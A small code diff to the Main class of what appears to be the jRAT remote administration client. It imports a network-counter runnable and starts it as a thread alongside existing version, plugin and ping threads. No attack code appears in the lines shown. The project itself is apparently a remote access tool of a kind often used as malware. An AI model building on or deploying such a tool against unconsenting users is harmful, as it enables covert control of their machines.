@@ -24,6 +24,7 @@ import se.jrat.client.settings.Settings;
 import se.jrat.client.settings.Statistics;
 import se.jrat.client.settings.Theme;
 import se.jrat.client.threads.RunnableCheckPlugins;
+import se.jrat.client.threads.RunnableNetworkCounter;
 import se.jrat.client.threads.ThreadCheckVersion;
 import se.jrat.client.threads.ThreadPing;
 import se.jrat.client.ui.dialogs.DialogEula;
@@ -144,6 +145,7 @@ public class Main {
 			// TODO Ad
 		}
 
+		new Thread(new RunnableNetworkCounter()).start();
 		new ThreadCheckVersion().start();
 		new Thread(new RunnableCheckPlugins()).start();
 		new ThreadPing().start();
